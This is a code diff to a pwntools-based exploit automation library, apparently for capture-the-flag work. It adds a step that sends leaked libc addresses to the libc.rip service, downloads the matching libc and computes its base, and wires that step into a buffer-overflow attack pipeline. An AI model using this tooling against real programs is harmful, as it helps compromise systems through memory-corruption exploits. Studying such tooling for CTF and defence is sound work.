@@ -5,6 +5,8 @@ from pwn import *
 
 # make mypy happy by explicitly importing what we use
 from pwn import tube, ELF, ROP, context, cyclic, cyclic_find, pack, log, process, unpack
+import requests
+
 from dataclasses import dataclass
 from typing import Callable, Dict, List, Optional
 from functools import reduce
@@ -37,6 +39,14 @@ def util_addressify(data: bytes) -> int:
     """Produce the address from a data leak."""
     result: int = unpack(data[: context.bits // 8].ljust(context.bits // 8, b"\x00"))
     return result
+
+
+def util_debug_requests(r: requests.Response) -> None:
+    """Print debugging information on a HTTP response."""
+    log.debug(r.request.headers)
+    log.debug(r.request.body)
+    log.debug(r.headers)
+    # log.debug(r.content)  # often too big
 
 
 def bof_corefile(state: PwnState) -> PwnState:
@@ -92,6 +102,49 @@ def leak_puts(state: PwnState) -> PwnState:
     return state
 
 
+def libc_rip(state: PwnState) -> PwnState:
+    """Acquire libc version using libc.rip.
+
+    We can programmatically find and download libc based on leaks
+    (two or more preferred). This function sets `state.libc`, including setting
+    `state.libc.address` for ready-to-use address calculation.
+    We expect some leaks in `state.leaks` beforehand."""
+    URL = "https://libc.rip/api/find"
+    LIBC_FILE = ".autorop.libc"
+    formatted_leaks: Dict[str, str] = {}
+    for symbol, address in state.leaks.items():
+        formatted_leaks[symbol] = hex(address)
+
+    log.info("Searching for libc based on leaks")
+    r = requests.post(URL, json={"symbols": formatted_leaks})
+    util_debug_requests(r)
+    json = r.json()
+    log.info(json)
+    if len(json) == 0:
+        log.error("could not find any matching libc!")
+    if len(json) > 1:
+        log.warning(f"{len(json)} matching libc's found, picking first one")
+
+    log.info("Downloading libc")
+    r = requests.get(json[0]["download_url"])
+    util_debug_requests(r)
+    with open(LIBC_FILE, "wb") as f:
+        f.write(r.content)
+
+    state.libc = ELF(LIBC_FILE)
+    # pick first leak and use that to calculate base
+    some_symbol, its_address = next(iter(state.leaks.items()))
+    state.libc.address = its_address - state.libc.symbols[some_symbol]
+
+    # sanity check
+    for symbol, address in state.leaks.items():
+        diff = address - state.libc.symbols[symbol]
+        if diff != 0:
+            log.warning(f"symbol {symbol} has delta with actual libc of {hex(diff)}")
+
+    return state
+
+
 def pipeline(state: PwnState, *funcs: Callable[[PwnState], PwnState]) -> PwnState:
     """Pass the PwnState through a "pipeline", sequentially executing each given function."""
 
@@ -107,4 +160,4 @@ def pipeline(state: PwnState, *funcs: Callable[[PwnState], PwnState]) -> PwnStat
 
 def classic(state: PwnState) -> PwnState:
     """Perform an attack against a non-PIE buffer-overflowable binary."""
-    return pipeline(state, bof_corefile, leak_puts)
+    return pipeline(state, bof_corefile, leak_puts, libc_rip)
